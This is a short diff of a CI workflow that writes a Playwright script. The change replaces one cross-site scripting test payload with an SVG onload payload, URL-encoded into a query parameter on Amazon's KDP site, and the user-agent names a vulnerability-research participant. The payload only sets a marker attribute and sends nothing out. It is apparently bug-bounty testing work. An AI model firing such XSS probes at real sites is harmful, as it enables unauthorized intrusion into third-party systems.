@@ -28,7 +28,7 @@ jobs:
           cat > /tmp/probe.mjs <<'JS'
           import { chromium } from "playwright";
           const ua="amazonvrpresearcher_pradyuman1";
-          const p="<img src=x onerror=\\"document.body.dataset.h1xss='EXECUTED'\\">";
+          const p="<svg/onload=document.body.dataset.h1xss=1>";
           const enc=encodeURIComponent(p);
           const targets=[
             ["kdp-q","https://kdp.amazon.com/en_US/?q="+enc],
